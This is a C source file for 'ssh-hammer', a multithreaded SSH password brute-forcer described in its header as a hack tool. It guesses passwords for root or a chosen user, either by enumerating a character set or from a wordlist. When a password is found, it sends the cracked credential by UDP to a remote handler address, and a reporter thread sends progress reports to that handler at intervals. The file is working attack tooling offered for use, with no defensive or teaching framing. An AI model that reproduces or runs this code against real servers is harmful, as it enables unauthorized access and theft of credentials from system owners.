/*
 *
 * This is a local hack tool that can be run on guess account
 * 
 * Build dependency: libssh2 libssh2-devel
   (it is tested on CentOS)

 * Compile it like this:
   gcc ssh-hammer.c -lssh2 -lpthread -o ssh-hammer
 *
 *
 */ 
 
#include <libssh2.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/types.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#include <pthread.h>
#include <getopt.h>
#include <limits.h>

static char username[32] = "root";
static char hostname[16] = "127.0.0.1";
static int ssh_port = 22;
unsigned long long passwd_pt = 0;
static char password[16][16] = {0};
FILE *fp_passwd, *fout;
static int  opt_verbose=0, opt_user=0, opt_thread_s=4, opt_input_mode = 0, pw_found=0, opt_report=0, opt_fout=0;
pthread_t attack_pid[16];
void * (*attack_thread[16])(void *);
int handler_port=0;
char handler_ip[16]={0};
char outname[64]={0};
char rbuff[512]={0};
const char wordset[]="$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#.+@?\0";
const int len_wordset=strlen(wordset);
int health_report(char *word);

static int waitsocket(int socket_fd, LIBSSH2_SESSION *session)
{
    struct timeval timeout;
    int rc;
    fd_set fd;
    fd_set *writefd = NULL;
    fd_set *readfd = NULL;
    int dir;
 
    timeout.tv_sec = 3;
    timeout.tv_usec = 0;
 
    FD_ZERO(&fd);
 
    FD_SET(socket_fd, &fd);
 
    /* now make sure we wait in the correct direction */ 
    dir = libssh2_session_block_directions(session);

 
    if(dir & LIBSSH2_SESSION_BLOCK_INBOUND)
        readfd = &fd;
 
    if(dir & LIBSSH2_SESSION_BLOCK_OUTBOUND)
        writefd = &fd;
 
    rc = select(socket_fd + 1, readfd, writefd, NULL, &timeout);
 
    return rc;
}

static int attack_payload(int sequence)
{
    unsigned long hostaddr;
    int sock;
    struct sockaddr_in sin;
    const char *fingerprint;
    LIBSSH2_SESSION *session;
    LIBSSH2_CHANNEL *channel;
    int rc;
    int exitcode = 0;
    char *exitsignal = (char *)"none";
    size_t len;
    LIBSSH2_KNOWNHOSTS *nh;
    int type;
    int pf=0;
    char passwd[16]={0};
    while(password[sequence][pf]!=0){passwd[pf]=password[sequence][pf];pf++;}
    passwd[pf]=0;pf=0;
 
    rc = libssh2_init(0);

    if(rc != 0) {
        /*libssh2 initialization failed*/
        return -1;
    }
 
    hostaddr = inet_addr(hostname);
    sock = socket(AF_INET, SOCK_STREAM, 0);
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(ssh_port);
    sin.sin_addr.s_addr = hostaddr;
    if(connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in)) != 0) {
        /*failed to connect*/
	close(sock);	    
        return -1;
    }
 
    /* Create a session instance */ 
    session = libssh2_session_init();

    if(!session){return -1;}
    /* tell libssh2 we want it all done non-blocking */ 
    libssh2_session_set_blocking(session, 0);
 
    /* ... start it up. This will trade welcome banners, exchange keys,
     * and setup crypto, compression, and MAC layers
     */ 
    while((rc = libssh2_session_handshake(session, sock)) == LIBSSH2_ERROR_EAGAIN);
    if(rc) {
	if(opt_verbose){
	    fprintf(stdout, "(%d) Server refuse, retrying\n", sequence);
	    if(opt_fout){
		fprintf(fout, "(%d) Server refuse, retrying\n", sequence);
	    }
	}
	libssh2_session_disconnect(session, "Damn");
	libssh2_session_free(session);
	close(sock);
        return -1;
    }
 
    nh = libssh2_knownhost_init(session);

    fingerprint = libssh2_session_hostkey(session, &len, &type);

    if(!fingerprint) {
	/*Empty fingerprint*/
	libssh2_session_disconnect(session, "Again");
        libssh2_session_free(session);
        close(sock);
        return 1;
    }
    libssh2_knownhost_free(nh);
 
    if(strlen(passwd) != 0) {
        /* Authenticate via password */ 
        while((rc = libssh2_userauth_password(session, username, passwd)) == LIBSSH2_ERROR_EAGAIN);
        if(rc) {
	    if(opt_verbose){
		fprintf(stdout, "(%d) trying:%s\n",sequence,passwd);
		if(opt_fout){
		    fprintf(fout, "(%d) trying:%s\n",sequence,passwd);
		}
	    }
	    libssh2_session_disconnect(session, "Damn");
	    libssh2_session_free(session);
	    close(sock);
            return 0;
        }
    }
    libssh2_trace(session, LIBSSH2_TRACE_SOCKET);

    /* Exec non-blocking on the remove host */ 
    while((channel = libssh2_channel_open_session(session)) == NULL && libssh2_session_last_error(session, NULL, NULL, 0) == LIBSSH2_ERROR_EAGAIN) {
        waitsocket(sock, session);
    }
     
    libssh2_session_disconnect(session, "HAHA, I got your key now");
    libssh2_session_free(session);

    close(sock);
    fprintf(stderr, "key found:[%s][%s]\n",username,passwd);pw_found=1;
    health_report(passwd);
    if(opt_fout){
	fprintf(fout, "key found:[%s][%s]\n",username,passwd);pw_found=1;
    }
    libssh2_exit();
 
    return 0;
}

void * attack_thread_0(){
    while(attack_payload(0)){sleep(1);}
    return 0;
}

void * attack_thread_1(){
    while(attack_payload(1)){sleep(1);}
    return 0;
}

void * attack_thread_2(){
    while(attack_payload(2)){sleep(1);}
    return 0;
}

void * attack_thread_3(){
    while(attack_payload(3)){sleep(1);}
    return 0;
}

void * attack_thread_4(){
    while(attack_payload(4)){sleep(1);}
    return 0;
}

void * attack_thread_5(){
    while(attack_payload(5)){sleep(1);}
    return 0;
}

void * attack_thread_6(){
    while(attack_payload(6)){sleep(1);}
    return 0;
}

void * attack_thread_7(){
    while(attack_payload(7)){sleep(1);}
    return 0;
}

void * attack_thread_8(){
    while(attack_payload(8)){sleep(1);}
    return 0;
}

void * attack_thread_9(){
    while(attack_payload(9)){sleep(1);}
    return 0;
}

void * attack_thread_A(){
    while(attack_payload(10)){sleep(1);}
    return 0;
}

void * attack_thread_B(){
    while(attack_payload(11)){sleep(1);}
    return 0;
}

void * attack_thread_C(){
    while(attack_payload(12)){sleep(1);}
    return 0;
}

void * attack_thread_D(){
    while(attack_payload(13)){sleep(1);}
    return 0;
}

void * attack_thread_E(){
    while(attack_payload(14)){sleep(1);}
    return 0;
}

void * attack_thread_F(){
    while(attack_payload(15)){sleep(1);}
    return 0;
}

int attack_thread_register(){
	attack_thread[0] = attack_thread_0;
	attack_thread[1] = attack_thread_1;
	attack_thread[2] = attack_thread_2;
	attack_thread[3] = attack_thread_3;
	attack_thread[4] = attack_thread_4;
	attack_thread[5] = attack_thread_5;
	attack_thread[6] = attack_thread_6;
	attack_thread[7] = attack_thread_7;
	attack_thread[8] = attack_thread_8;
	attack_thread[9] = attack_thread_9;
	attack_thread[10] = attack_thread_A;
	attack_thread[11] = attack_thread_B;
	attack_thread[12] = attack_thread_C;
	attack_thread[13] = attack_thread_D;
	attack_thread[14] = attack_thread_E;
	attack_thread[15] = attack_thread_F;
	return 0;
}

int num2passwd(char *passwd, unsigned long long num){
    int pf = 0, cpd = 0;
    while(num){
	if((cpd=num%len_wordset)==0){return -1;}
	passwd[pf++]=wordset[cpd];
	num/=len_wordset;
    }
    passwd[pf]=0;
    return 0;
}

int use_int_passwd(){
    int pf = 0, pf_2 = 0, th_s = opt_thread_s;
    unsigned long long num;
    for(pf = 0; pf < th_s; pf++){
        for(pf_2 = 0; pf_2 < 16; pf_2++){
            password[pf][pf_2] = 0;
        }
    }

    for(num=passwd_pt+1;;){
	for(pf=0;pf<th_s;){
	    if(!num2passwd(password[pf],num)){
                while(pthread_create(attack_pid+pf, NULL, attack_thread[pf], NULL)){usleep(50000);}
                ++pf;
		usleep(50000);
	    }
	    ++num;
        }
        Wait4Join:
        for(pf=0;pf<th_s;pf++){
            pthread_join(attack_pid[pf],NULL);
        }
        if(pw_found){return 0;}
	passwd_pt=num;
    }

    return 0;
}

int use_ext_passwd(){
	int pf = 0, pf_2 = 0, th_s = opt_thread_s, endofread = 0;

	for(pf = 0; pf < th_s; pf++){
		for(pf_2 = 0; pf_2 < 16; pf_2++){
			password[pf][pf_2] = 0;
		}
	}
	while(1){
		for(pf=0;pf<th_s;pf++){
			if(fgets(password[pf],16,fp_passwd)==NULL){endofread=1;goto Wait4Join;}
			password[pf][strlen(password[pf])-1]=0;
			while(pthread_create(attack_pid+pf, NULL, attack_thread[pf], NULL)){usleep(50000);}
			++passwd_pt;
			usleep(50000);
	
		}
		Wait4Join:
		for(pf=0;pf<th_s;pf++){
			pthread_join(attack_pid[pf],NULL);
		}
		if(pw_found){return 0;}
		if(endofread){break;}
	}

	return 0;
}

int health_report(char *word)
{
    int sockfd, num, pf;
    struct hostent *he;
    struct sockaddr_in server;

    if((sockfd=socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        return -1;
    }
    bzero(&server, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(handler_port);

    server.sin_addr.s_addr = inet_addr(handler_ip);
    struct timeval timeout;
    timeout.tv_sec = 5; timeout.tv_usec = 0;
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) == -1)
    {
        close(sockfd);
        return -1;
    }

    if(connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1)
    {
        close(sockfd);
        return -1;
    }
    send(sockfd, word, strlen(word), 0);
    close(sockfd);
    return 0;
}

void * reporter_thread(){
    FILE *HKpress;
    char pbuff[128];
    while(!pw_found){
	sleep(900);
	sprintf(rbuff,"%llu>%s\0",passwd_pt,password[0]);
	health_report(rbuff);
    }
    while((HKpress=fopen(outname,"r"))==NULL){
	fprintf(stdout,"HK press is not fast enough to fetch %s\n",outname);
	usleep(500000);
    }
    fseek(HKpress,-256L,2);
    while(fgets(pbuff,128,HKpress)!=NULL){
	strcat(rbuff,pbuff);
    }
    strcat(rbuff,"\0");
    fclose(HKpress);
    health_report(rbuff);

    return 0;
}

int setHandler(char *hin){
    char *opt=strdup(hin), *shandler_ip;
    int shandler_port;
    shandler_ip=strsep(&opt,":");
    shandler_port=atoi(strsep(&opt,":"));
    free((void*)opt);
    strcpy(handler_ip,shandler_ip);
    handler_port=shandler_port;
    opt_report=1;
    return 0;
}

int setFout(char *outname){
    fout=fopen(outname,"a");
    opt_fout=1;
    return 0;
}

int usage_print(char *pName){
    fprintf(stdout,"Usage: %s [-option]/[-option] [args] IP\n",pName);
    fprintf(stdout,"option:\n\n");
    fprintf(stdout,"  --help, -h              Display this help info.\n\n");
    fprintf(stdout,"  --verbose, -v, -V       Verbose mode, show all info.\n\n");
    fprintf(stdout,"  --port 22, -p 22        Set target port as 22 (default).\n\n");
    fprintf(stdout,"  --user jwmei, -u jwmei  Set target as jwmei instead of root.\n\n");
    fprintf(stdout,"  -i pw.txt               Read password list from pw.txt\n\n");
	fprintf(stdout,"  --thread 4, -t 4        Use 4 threads to attack simultaneously,\n");
	fprintf(stdout,"                          default set to 4, max 16 is allowed,\n");
	fprintf(stdout,"                          but server may refuse some sessions.\n\n");
	fprintf(stdout,"\nRun it like this:\n\n");
	fprintf(stdout,"   %s 127.0.0.1 -p 22 -u admin -t 6 -v\n",pName);
	fprintf(stdout,"   %s 127.0.0.1 -u root -t 6 -v -r 115.243.23.666:8001\n",pName);
    return 0;
}

int main(int argc, char *argv[]){

    struct option long_option[]=
	{
		{"help", 0, NULL, 'h'},
		{"verbose", 0, NULL, 'v'},
		{"Verbose", 0, NULL, 'V'},
		{"port", 1, NULL, 'p'},
		{"Port", 1, NULL, 'P'},
		{"user", 1, NULL, 'u'},
		{"thread", 1, NULL, 't'},
		{"report", 1, NULL, 'r'},
		{"input", 1, NULL, 'i'},
		{"output", 1, NULL, 'o'},
		{"breakin", 1, NULL, 'b'},
		{"NULL", 0, NULL, 0}
	};

	int pf=0, Copt;
	char path_passwd[64]={0}, handler_input[32]={0};
	pthread_t report_pid;

    if(argc<2){usage_print(argv[0]);return 0;}
    while(!((Copt = getopt_long(argc, argv, "hvp:u:t:i:r:o:b:", long_option, NULL)) < 0)){
		switch(Copt){
	    case 'h':
		usage_print(argv[0]);
		return 0;
	    case 'v':
	    case 'V':
		opt_verbose = 1;
		break;
	    case 'p':
	    case 'P':
		ssh_port = atoi(optarg);
		break;
	    case 'u':
		opt_user = 1;pf = 0;
		while(optarg[pf]!=0){username[pf]=optarg[pf];pf++;}
		username[pf]=0;pf=0;
		break;
		case 't':
		opt_thread_s = atoi(optarg);
		opt_thread_s<1?1:opt_thread_s;
		opt_thread_s>16?16:opt_thread_s;
		break;
		case 'i':
		opt_input_mode = 1; pf = 0;
		while(optarg[pf]!=0){path_passwd[pf]=optarg[pf];pf++;}
		break;
	    case 'r':
		pf=0;
		while(optarg[pf]!=0){handler_input[pf]=optarg[pf];pf++;}
		fprintf(stdout,"Set Handler as %s\n",handler_input);
		setHandler(handler_input);
		break;
	    case 'b':
		passwd_pt=strtoul(optarg,NULL,0);
		break;
	    case 'o':
		pf=0;
		while(optarg[pf]!=0){outname[pf]=optarg[pf];pf++;}
		setFout(outname);
		break;
		}
    }
    if(optind==argc){
		fprintf(stdout,"Please specify IP to attack\n\n");
		usage_print(argv[0]);
		return -1;
    }

    pf=0;   /* Copy the input ip to hostname[] */
    while(argv[optind][pf]!=0){hostname[pf]=argv[optind][pf];pf++;}
    hostname[pf]=0;pf=0;
    
    if(!opt_user){
		fprintf(stdout,"User unspcified, attack root as default\n\n");
    }
    if(opt_report&&(!opt_fout)){
	fprintf(stdout,"-o [filename] must specified when using report mode, automatically set to .hout\n\n");
	strcpy(outname,".hout");
	setFout(outname);
	sleep(2);
    }
    if(opt_report){
	pf=0;
	while(pthread_create(&report_pid, NULL, reporter_thread, NULL)){
	    fprintf(stdout,"reporter thread re-apply: 0x%02x\n",pf++);
	    if(pf>6){break;}
	    usleep(500000);
	}
	if(pf>6){fprintf(stdout,"fail to boot HK press\n");return -1;}
	fprintf(stdout,"reporter is on\n");
    }
	attack_thread_register();

    fprintf(stdout,"Attacking host ---> %s@%s:%d\n",username,hostname,ssh_port);

	if(opt_input_mode){
		if((fp_passwd=fopen(path_passwd,"r"))==NULL){
			fprintf(stderr,"\nfatal: unable to read passwd from %s\n",path_passwd);
			return -1;
		}
		use_ext_passwd();
		fclose(fp_passwd);
	}else{
		use_int_passwd();
	}
	if(opt_fout){fclose(fout);}
    if(opt_report){pthread_join(report_pid,NULL);} 
    return 0;
}
